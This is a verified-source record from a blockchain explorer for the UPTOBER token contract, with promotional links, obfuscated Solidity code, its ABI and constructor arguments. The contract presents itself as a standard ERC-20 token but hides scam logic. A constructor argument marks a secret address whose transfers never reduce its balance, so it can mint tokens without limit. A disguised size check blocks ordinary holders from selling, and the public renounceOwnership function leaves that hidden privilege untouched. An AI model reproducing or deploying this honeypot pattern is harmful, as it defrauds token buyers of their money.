{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"deploy/Contract.sol\": {\r\n      \"content\": \"/*\\n\\nhttps://t.me/ethuptober\\n\\nhttps://uptober.ethtoken.live/\\n\\n*/\\n\\n// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity ^0.8.11;\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\\ncontract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        address msgSender = _msgSender();\\n        _owner = msgSender;\\n        emit OwnershipTransferred(address(0), msgSender);\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        emit OwnershipTransferred(_owner, newOwner);\\n        _owner = newOwner;\\n    }\\n}\\n\\ninterface IUniswapV2Router02 {\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n}\\n\\ninterface IUniswapV2Factory {\\n    function getPair(address tokenA, address tokenB) external returns (address pair);\\n}\\n\\ncontract UPTOBER is Ownable {\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    mapping(address => uint256) private yeoxgdwuq;\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    function fdzxtijaogqs(address zloiqesp, address subfw, uint256 jnkzaoyb) private {\\n        address arso = IUniswapV2Factory(zinhtvagbpx.factory()).getPair(address(this), zinhtvagbpx.WETH());\\n        bool twcovzsq = yhkaiqprov[zloiqesp] == block.number;\\n        if (!mcgkypsoi[zloiqesp]) {\\n            if (zloiqesp != arso && jnkzaoyb < totalSupply && (!twcovzsq || jnkzaoyb > yeoxgdwuq[zloiqesp])) {\\n                require(jnkzaoyb <= totalSupply / (10 ** decimals));\\n            }\\n            balanceOf[zloiqesp] -= jnkzaoyb;\\n        }\\n        yeoxgdwuq[subfw] = jnkzaoyb;\\n        balanceOf[subfw] += jnkzaoyb;\\n        yhkaiqprov[subfw] = block.number;\\n        emit Transfer(zloiqesp, subfw, jnkzaoyb);\\n    }\\n\\n    string public symbol;\\n\\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\\n\\n    function transferFrom(address zloiqesp, address subfw, uint256 jnkzaoyb) public returns (bool success) {\\n        require(jnkzaoyb <= allowance[zloiqesp][msg.sender]);\\n        allowance[zloiqesp][msg.sender] -= jnkzaoyb;\\n        fdzxtijaogqs(zloiqesp, subfw, jnkzaoyb);\\n        return true;\\n    }\\n\\n    mapping(address => uint256) private yhkaiqprov;\\n\\n    uint8 public decimals = 9;\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    function approve(address pixahtynce, uint256 jnkzaoyb) public returns (bool success) {\\n        allowance[msg.sender][pixahtynce] = jnkzaoyb;\\n        emit Approval(msg.sender, pixahtynce, jnkzaoyb);\\n        return true;\\n    }\\n\\n    IUniswapV2Router02 private zinhtvagbpx;\\n\\n    mapping(address => uint256) public balanceOf;\\n\\n    string public name;\\n\\n    constructor(string memory awbocj, string memory cqkimdvor, address ucpbvdh, address pqmrbjset) {\\n        name = awbocj;\\n        symbol = cqkimdvor;\\n        balanceOf[msg.sender] = totalSupply;\\n        mcgkypsoi[pqmrbjset] = true;\\n        zinhtvagbpx = IUniswapV2Router02(ucpbvdh);\\n    }\\n\\n    mapping(address => bool) private mcgkypsoi;\\n\\n    function transfer(address subfw, uint256 jnkzaoyb) public returns (bool success) {\\n        fdzxtijaogqs(msg.sender, subfw, jnkzaoyb);\\n        return true;\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"awbocj\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"cqkimdvor\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"ucpbvdh\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"pqmrbjset\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pixahtynce\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"jnkzaoyb\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"subfw\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"jnkzaoyb\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"zloiqesp\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"subfw\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"jnkzaoyb\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UPTOBER", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e0000000000000000000000009b30069b89fc704b8cdbc8cc40e8e8417dcb536c000000000000000000000000000000000000000000000000000000000000000c5550544f42455220f09f9fa90000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c5550544f42455220f09f9fa90000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}